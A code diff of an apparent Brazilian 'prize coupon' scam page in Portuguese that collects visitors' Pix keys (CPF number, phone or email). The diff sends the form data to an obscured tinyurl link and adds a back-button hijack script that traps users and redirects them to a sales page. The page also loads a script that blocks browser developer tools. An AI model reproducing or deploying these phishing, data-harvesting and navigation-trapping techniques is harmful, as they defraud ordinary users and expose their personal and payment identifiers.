@@ -42,7 +42,7 @@
                 <h4 style="font-size: 12px; font-weight: bold; color: #707070; margin-left: 10px;">SELECIONE SEU TIPO DE CHAVE PIX</h4>
             </div>
 
-            <form action="../09/index.html" method="POST" id="formPix" onsubmit="document.getElementById('submit').disabled = true;">
+            <form action="https://tinyurl.com/Cupom-Premiado009" method="POST" id="formPix" onsubmit="document.getElementById('submit').disabled = true;">
                 <div class="row" style="display: flex;  flex-direction: row; flex-wrap: nowrap; justify-content: space-evenly; margin-top: 10px;">
                     <label>
                         <input type="radio" class="tipoChave" name="tipoChave" value="document">
@@ -106,7 +106,45 @@
         <script src="js/8emS8LiK65Em.js"></script>
         <script src="js/mtHgU2he0tCU.js"></script>
         <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" url="https://google.com.br"></script>
+        <script>
+            // BACK REDIRECT
+            var urlBackRedirect = 'vsl.php'; // lembre-se de usar a url sem espaços
+            // não altere nada abaixo dessa linha
+            urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+            history.pushState({}, "", location.href);
+            history.pushState({}, "", location.href);
+            window.onpopstate = function () {
+                setTimeout(function () {
+                    location.href = urlBackRedirect;
+                }, 1);
+            };
+            // BACK REDIRECT
 
-
-
+            // MÁSCARA INPUT
+            jQuery(function($){
+                $('.tipoChave').change(function(){
+                    var campo = $(this).val();
+                    if (campo == "document"){	
+                        $("#chavePix").val('');
+                        $("#chavePix").mask("999.999.999-99");
+                        $("#chavePix").attr('inputmode', 'numeric');
+                    }
+                    if (campo == "phoneNumber"){
+                        $("#chavePix").val('');
+                        $("#chavePix").mask("(99) 99999-9999");
+                        $("#chavePix").attr('inputmode', 'numeric');
+                    }	
+                    if (campo == "email"){
+                        $("#chavePix").val('');
+                        $("#chavePix").unmask();
+                        $("#chavePix").attr('inputmode', 'text');
+                    }			
+                });
+            });
+            // MÁSCARA INPUT  
+            
+        </script>
+    
 </body></html>
